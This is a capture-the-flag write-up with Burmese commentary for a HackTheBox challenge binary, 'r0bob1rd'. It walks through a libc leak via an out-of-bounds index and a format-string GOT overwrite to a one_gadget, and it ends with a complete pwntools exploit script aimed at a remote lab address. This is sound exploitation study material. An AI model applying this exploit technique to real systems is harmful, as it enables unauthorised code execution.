
#### rObob1rd

```c
wndbg> checksec
File:     /home/Jackfruit/cate/learn/binary/stack/htb/rObob1rd/r0bob1rd
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'./glibc/'
Stripped:   No

```

`Partial RELRO`ဆိုတော့ `GOT.plt` overwrite လို့ရတယ်
PIE enable ဆိုတော့ ‌address leak လို့ကောင်းတာပေါ့
ကိုယ်ပိုင် `glibc` နဲ့ run ခိုင်းတယ်
အဆင်ပြေတယ် `glibc` version ရှာစရာမလိုတော့


```c

undefined8 main(void)

{
  ignore_me_init_buffering();
  ignore_me_init_signal();
  banner();
  printRobobirds(robobirdNames);
  operation();
  return 0;
}

```

```c

void operation(void)

{
  long in_FS_OFFSET;
  int local_7c;
  char printf_var [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("\nSelect a R0bob1rd > ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00400eb5,&local_7c);
  if ((local_7c < 0) || (9 < local_7c)) {
     printf("\nYou\'ve chosen: %s",robobirdNames + (long)local_7c * 8);
  }
  else {
     printf("\nYou\'ve chosen: %s",*(undefined8 *)(robobirdNames + (long)local_7c * 8));
  }
  getchar();
  puts("\n\nEnter bird\'s little description");
  printf("> ");
  fgets(printf_var,106,stdin);
  puts("Crafting..");
  usleep(2000000);
  start_screen();
  puts("[Description]");
  printf(printf_var);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                         /* WARNING: Subroutine does not return */
     __stack_chk_fail();
  }
  return;
}

```

ဘာမြင်လဲဆို ထုံးစံအတိုင်း format string မြင်တယ် ` fgets(printf_var,106,stdin);` ကလည်း နည်းနည်း 2 byte boundထပ်ကျော်နေတယ်
```c
  puts("\n\nEnter bird\'s little description");
  printf("> ");
  fgets(printf_var,106,stdin);
  puts("Crafting..");
  usleep(2000000);
  start_screen();
  puts("[Description]");
  printf(printf_var);
```


```python
  __isoc99_scanf(&DAT_00400eb5,&local_7c);
  if ((local_7c < 0) || (9 < local_7c)) {
     printf("\nYou\'ve chosen: %s",robobirdNames + (long)local_7c * 8);
  }
  else {
     printf("\nYou\'ve chosen: %s",*(undefined8 *)(robobirdNames + (long)local_7c * 8));
  }
```

အစက ဒီကောင်ကိုသတိမထားမိဘူး 
 first user input (number) မှာတင်  `libc` address  leak ဖို့ ငါတို့ chance ရှိတယ်
 initialized global variable မှာသိမ်းထားတဲ့ array တွေကိုပြပေးတယ်

```c
                             robobirdNames                                   XREF[5]:     Entry Point(*), 
                                                                                          operation:00400b35(*), 
                                                                                          operation:00400b3c(*), 
                                                                                          operation:00400b63(*), 
                                                                                          main:00400c3c(*)  
        006020a0 e8 0c 40        undefine
                 00 00 00 
                 00 00 f2 
           006020a0 e8              undefined1E8h                     [0]           ?  ->  00400ce8     XREF[5]:     Entry Point(*), 
                                                                                                                     operation:00400b35(*), 
                                                                                                                     operation:00400b3c(*), 
                                                                                                                     operation:00400b63(*), 
                                                                                                                     main:00400c3c(*)  
           006020a1 0c              undefined10Ch                     [1]
           006020a2 40              undefined140h                     [2]
           006020a3 00              undefined100h                     [3]
           006020a4 00              undefined100h                     [4]
           006020a5 00              undefined100h                     [5]
           006020a6 00              undefined100h                     [6]
           006020a7 00              undefined100h                     [7]
           006020a8 f2              undefined1F2h                     [8]           ?  ->  00400cf2
           006020a9 0c              undefined10Ch                     [9]
           006020aa 40              undefined140h                     [10]
           006020ab 00              undefined100h                     [11]
           006020ac 00              undefined100h                     [12]
           006020ad 00              undefined100h                     [13]
           006020ae 00              undefined100h                     [14]
           006020af 00              undefined100h                     [15]
           006020b0 ff              undefined1FFh                     [16]          ?  ->  00400cff

....


```

	006020a1 ကနေ 8 byte ဆီ မြှောက်ပြီး ရွေ့ပြီးပြပေးတယ် ဆိုတော့ 8 byte မှာ 1x (1ဆ)ပေါ့
ဆိုတော့ ငါတို့ ဒီကနေ `got.pl`t address တစ်ခုခုကို leak ပြီး` libc base `တွက်မယ်
NO PIE ဆို‌တော့ PLT address နဲ့ GOT entry address တွေက fixed ဖြစ်နေမှာဘဲ

```c
State of the GOT of /home/Jackfruit/cate/learn/binary/stack/htb/rObob1rd/r0bob1rd:
GOT protection: Partial RELRO | Found 12 GOT entries passing the filter
[0x602018] _exit@GLIBC_2.2.5 -> 0x400766 (_exit@plt+6) ◂— push 0 /* 'h' */
[0x602020] puts@GLIBC_2.2.5 -> 0x400776 (puts@plt+6) ◂— push 1
[0x602028] __stack_chk_fail@GLIBC_2.4 -> 0x400786 (__stack_chk_fail@plt+6) ◂— push 2
[0x602030] printf@GLIBC_2.2.5 -> 0x400796 (printf@plt+6) ◂— push 3
[0x602038] alarm@GLIBC_2.2.5 -> 0x4007a6 (alarm@plt+6) ◂— push 4
[0x602040] fgets@GLIBC_2.2.5 -> 0x4007b6 (fgets@plt+6) ◂— push 5
[0x602048] getchar@GLIBC_2.2.5 -> 0x4007c6 (getchar@plt+6) ◂— push 6
[0x602050] signal@GLIBC_2.2.5 -> 0x4007d6 (signal@plt+6) ◂— push 7
[0x602058] fflush@GLIBC_2.2.5 -> 0x4007e6 (fflush@plt+6) ◂— push 8
[0x602060] setvbuf@GLIBC_2.2.5 -> 0x4007f6 (setvbuf@plt+6) ◂— push 9 /* 'h\t' */
[0x602068] __isoc99_scanf@GLIBC_2.7 -> 0x400806 (__isoc99_scanf@plt+6) ◂— push 0xa /* 'h\n' */
[0x602070] usleep@GLIBC_2.2.5 -> 0x400816 (usleep@plt+6) ◂— push 0xb /* 'h\x0b' */

```

`0x602030 မှာရှိတဲ့ printf GOT `ကို leak မယ်
006020a0 ကနေ 0x602030 ဆိုတော့ ငယ်သွားမှာဆိုတော့ minus(-) သုံးရမယ်
112 (0x70) byte ကွာခြားမှုရှိတယ် 14 ဆဖြစ်မယ်
ဆိုတော့ -14 ဖြစ်မယ်
GOT address ရလာရင် libc base တွက်မယ်


```c
└─$ one_gadget glibc/libc.so.6 
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

```

ပြီးရင် one gadget ရှာပြီး `libc  base` နဲ့ပေါင်းမယ်
format string vuln ကိုသုံးပြီး `[0x602028] __stack_chk_fail@GLIBC_2.4 ` address ကို overwrite လုပ်မယ်


```python
from pwn import *


context.log_level = 'info'
context.binary = "./r0bob1rd"
elf = context.binary

def start():
    if args.R:
        return remote("154.57.164.82", 32310)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            b *0x0000000000400b4f
            b *0x0000000000400b14
            b *0x0000000000400b7c
            b *0x0000000000400c08            
            continue
        ''')
    else:
        return process(elf.path)

def libc_leak(p):
    
    p.recvuntil(b"lect a R0bob1rd > ")
    p.sendline(b"-14")
    p.recvuntil("'ve chosen: ")
    print_f = p.recv(6).ljust(8, b"\x00")
    print_f = u64(print_f)
    print(f"Leaked printf: {hex(print_f)}")
    libc = print_f - 0x0000000000061c90
    print(f"Leaked libc: {hex(libc)}")
    return libc

def exploit(p, shell):
    p.recvuntil(b"little description")
    p.recvuntil(b"> ")
    target = 0x602028
    offset = 8
    payload = fmtstr_payload(offset, {target: shell},write_size='short')
    payload = payload.ljust(106, b'\x90')
    p.sendline(payload)
    p.interactive()



if __name__ == '__main__':
    io = start()
    libc = libc_leak(io)
    shell = libc + 0xe3b01
    print("shell address: ", hex(shell))
    exploit(io, shell)
```



